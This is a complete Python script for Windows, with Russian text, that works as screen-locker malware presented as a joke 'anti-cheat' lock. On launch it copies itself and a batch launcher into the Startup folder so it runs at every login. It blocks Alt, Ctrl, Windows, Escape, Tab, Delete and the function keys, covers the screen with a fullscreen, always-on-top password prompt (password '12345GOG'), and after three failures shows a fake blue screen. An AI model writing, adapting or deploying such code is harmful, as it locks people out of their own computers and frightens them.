import tkinter as tk
import ctypes
import sys
import keyboard
import threading
import time
import random
import os
import shutil

# Пароль
PASSWORD = "12345GOG"
attempts = 0
MAX_ATTEMPTS = 3

# ============================================
# АВТОМАТИЧЕСКОЕ ДОБАВЛЕНИЕ В АВТОЗАГРУЗКУ
# ============================================
def add_to_startup():
    try:
        # Путь к текущему файлу
        current_file = os.path.abspath(sys.argv[0])
        
        # Папка автозагрузки
        startup_folder = os.path.join(os.environ['APPDATA'], 
                                      'Microsoft', 'Windows', 'Start Menu', 
                                      'Programs', 'Startup')
        
        # Новое имя и путь
        new_file = os.path.join(startup_folder, "winlocker.py")
        
        # Копируем себя в автозагрузку (если ещё не там)
        if current_file != new_file:
            shutil.copy2(current_file, new_file)
            
            # Создаем батник для надежности (если Python не в PATH)
            bat_path = os.path.join(startup_folder, "winlocker.bat")
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\npython "{new_file}"')
    except:
        pass  # Если не получилось - не страшно

# Блокировка клавиш
def block_hotkeys():
    cheater_keys = ['alt', 'ctrl', 'windows', 'tab', 'delete', 'escape',
                    'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8',
                    'f9', 'f10', 'f11', 'f12', 'alt gr']
    for key in cheater_keys:
        try:
            keyboard.block_key(key)
        except:
            pass

# Античит-сообщения
def get_cheater_message():
    messages = [
        "АЙ-ЯЙ-ЯЙ! ЧИТИТЬ - НЕ ХОРОШО!",
        "БАН ЗА ЧИТЫ!",
        "АНТИЧИТ ОБНАРУЖИЛ ВЗЛОМЩИКА!",
        "ЗАЧЕМ ТЫ ПЫТАЕШЬСЯ ВЗЛОМАТЬ?",
        "ТЫ НЕ ПРОЙДЕШЬ, ЧИТЕР!",
        "СКАЗАНО ЖЕ: НЕЛЬЗЯ ЧИТЕРИТЬ!",
        "ТВОЙ АЙПИ ЗАБЛОКИРОВАН (ШУТКА)"
    ]
    return random.choice(messages)

# Фейковый синий экран
def anti_cheat_bsod():
    bsod = tk.Toplevel()
    bsod.attributes('-fullscreen', True)
    bsod.attributes('-topmost', True)
    bsod.configure(bg='#0000AA')
    bsod.overrideredirect(True)

    cheat_text = get_cheater_message()
    
    text = (
        "\n\n\n\n"
        "   ⚠️ ОБНАРУЖЕНА ЧИТ-ПОПЫТКА ⚠️\n\n"
        f"   {cheat_text}\n\n"
        "   3 НЕВЕРНЫХ ПОПЫТКИ ВВОДА\n\n"
        "   Код ошибки: CHEATER_DETECTED_1337\n\n\n\n"
        "   🎮 ЧИТЕРЫ НЕ ПРОХОДЯТ В ЭТОМ ЛЕСУ 🎮"
    )

    tk.Label(bsod, text=text, font=("Consolas", 20, "bold"),
             fg="white", bg="#0000AA", justify="left").pack()
    
    tk.Label(bsod, text="⌨️ 🚫 🎮", font=("Arial", 40),
             fg="white", bg="#0000AA").pack(pady=50)

    bsod.update()
    time.sleep(7)
    bsod.destroy()

# Основное окно
root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='#0a0a0a')
root.overrideredirect(True)

tk.Label(root, text="⚠️ АНТИЧИТ-СИСТЕМА АКТИВИРОВАНА ⚠️",
         font=("Courier New", 28, "bold"), fg="#00ff00", bg="#0a0a0a").pack(pady=100)

tk.Label(root, text=">>> ОБНАРУЖЕНА ПОДОЗРИТЕЛЬНАЯ АКТИВНОСТЬ <<<",
         font=("Courier New", 16), fg="#ff0000", bg="#0a0a0a").pack(pady=10)

tk.Label(root, text="ВВЕДИТЕ ПАРОЛЬ ДЛЯ ПОДТВЕРЖДЕНИЯ, ЧТО ВЫ НЕ ЧИТЕР:",
         font=("Courier New", 14), fg="#ffffff", bg="#0a0a0a").pack(pady=20)

attempts_label = tk.Label(root, 
                         text=f"ПОПЫТОК: 0 / {MAX_ATTEMPTS} | НЕЛЬЗЯ ЧИТЕРИТЬ!",
                         font=("Courier New", 12), fg="#888888", bg="#0a0a0a")
attempts_label.pack()

entry = tk.Entry(root, font=("Courier New", 24), show="*",
                 width=10, justify='center', bg="#222222", fg="#00ff00",
                 insertbackground="#00ff00")
entry.pack(pady=30)
entry.focus()

error_label = tk.Label(root, text="", font=("Courier New", 14),
                       fg="#ffff00", bg="#0a0a0a")
error_label.pack()

def unlock():
    global attempts
    if entry.get() == PASSWORD:
        win = tk.Toplevel()
        win.attributes('-fullscreen', True)
        win.configure(bg='#00aa00')
        win.overrideredirect(True)
        tk.Label(win, text="✅ ДОСТУП РАЗРЕШЕН ✅\n\nТЫ НЕ ЧИТЕР!", 
                font=("Arial", 40, "bold"), fg="white", bg="#00aa00").pack(pady=200)
        win.update()
        time.sleep(2)
        root.destroy()
        sys.exit()
    else:
        attempts += 1
        attempts_label.config(text=f"ПОПЫТОК: {attempts} / {MAX_ATTEMPTS} | НЕЛЬЗЯ ЧИТЕРИТЬ!")
        
        cheater_msg = get_cheater_message()
        error_label.config(text=f"❌ {cheater_msg} ❌")
        entry.delete(0, tk.END)

        if attempts >= MAX_ATTEMPTS:
            error_label.config(text="💀 ТЫ ЧИТЕР! ПОЛУЧИ СИНИЙ ЭКРАН! 💀")
            root.update()
            time.sleep(1.5)
            anti_cheat_bsod()
            root.destroy()
            sys.exit()

btn = tk.Button(root, text="[ ПРОВЕРИТЬ ПАРОЛЬ ]",
                font=("Courier New", 16, "bold"),
                bg="#333333", fg="#00ff00",
                activebackground="#555555", activeforeground="#ffffff",
                command=unlock)
btn.pack(pady=20)

# ============================================
# ЗАПУСК
# ============================================

# Добавляем себя в автозагрузку
add_to_startup()

# Блокируем клавиши
threading.Thread(target=block_hotkeys, daemon=True).start()

# Перехват Enter
root.bind('<Return>', lambda e: unlock())

# Запуск
root.mainloop()